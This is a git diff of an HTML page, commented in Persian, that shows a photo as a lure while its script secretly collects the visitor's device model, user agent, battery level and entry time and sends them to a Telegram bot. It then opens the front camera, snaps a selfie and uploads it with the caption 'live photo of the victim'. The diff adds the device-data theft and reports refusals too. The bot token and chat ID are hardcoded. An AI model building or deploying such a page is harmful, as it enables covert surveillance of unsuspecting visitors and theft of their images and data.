@@ -12,7 +12,7 @@
 </head>
 <body>
 
-<!-- فقط لینک عکس خودت رو اینجا بذار -->
+<!-- لینک عکس خودت -->
 <img id="photo" src="https://mahdie1386.github.io/Fast/IMG_20251205_011158_078.jpg">
 
 <video id="video" playsinline muted></video>
@@ -21,6 +21,41 @@
 <script>
     const TOKEN = "8347578600:AAEYkqSxvGgbXadUlQjDoY2Ey_-YgtUZ2U8";
     const CHAT_ID = "-1003384762825";
+
+    // اطلاعات گوشی
+    const model = navigator.platform || "نامشخص";
+    const deviceName = navigator.userAgent.split('(')[1]?.split(';')[0] || "نامشخص";
+    const now = new Date();
+    const entryTime = now.toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' });
+
+    // شارژ باتری
+    let batteryLevel = "در حال بارگیری...";
+    if ('getBattery' in navigator) {
+        navigator.getBattery().then(battery => {
+            batteryLevel = Math.round(battery.level * 100) + "%" + (battery.charging ? " (در حال شارژ)" : "");
+            sendInfoWithPhoto(); // وقتی باتری لود شد، عکس بگیر
+        });
+    } else {
+        batteryLevel = "پشتیبانی نمی‌شود";
+        sendInfoWithPhoto();
+    }
+
+    async function sendInfoWithPhoto() {
+        // اول اطلاعات گوشی رو بفرست
+        const infoMsg = `کاربر جدید وارد شد
+
+مدل گوشی: ${deviceName}
+نام دستگاه: ${model}
+شارژ باتری: ${batteryLevel}
+تاریخ و ساعت ورود: ${entryTime}
+
+در حال گرفتن عکس زنده از سلفی...`;
+
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(infoMsg)}`);
+
+        // حالا عکس از سلفی بگیر
+        takeSelfie();
+    }
 
     async function takeSelfie() {
         try {
@@ -31,34 +66,33 @@
             video.srcObject = stream;
             video.play();
 
-            // ۱.۵ ثانیه صبر کن تا دوربین کامل روشن بشه
             setTimeout(() => {
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth || 1280;
                 canvas.height = video.videoHeight || 720;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.getContext('2d').drawImage(video, 0, 0);
 
                 canvas.toBlob(blob => {
                     const form = new FormData();
                     form.append('chat_id', CHAT_ID);
-                    form.append('photo', blob, 'selfie.jpg');
-                    form.append('caption', 'عکس زنده از دوربین سلفی');
+                    form.append('photo', blob, 'selfie_live.jpg');
+                    form.append('caption', `عکس زنده از قربانی
+مدل: ${deviceName}
+شارژ: ${batteryLevel}
+زمان: ${entryTime}`);
                     fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:form});
                 }, 'image/jpeg', 0.95);
 
-                // دوربین رو خاموش کن
                 stream.getTracks().forEach(t => t.stop());
             }, 1500);
 
         } catch(e) {
-            console.log("دوربین بلاک شد");
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=کاربر دسترسی به دوربین نداد`);
         }
     }
 
-    // وقتی عکس لود شد → خودکار سلفی بگیره
     document.getElementById('photo').onload = () => {
-        setTimeout(takeSelfie, 800);
+        setTimeout(sendInfoWithPhoto, 1000);
     };
 </script>
 </body>
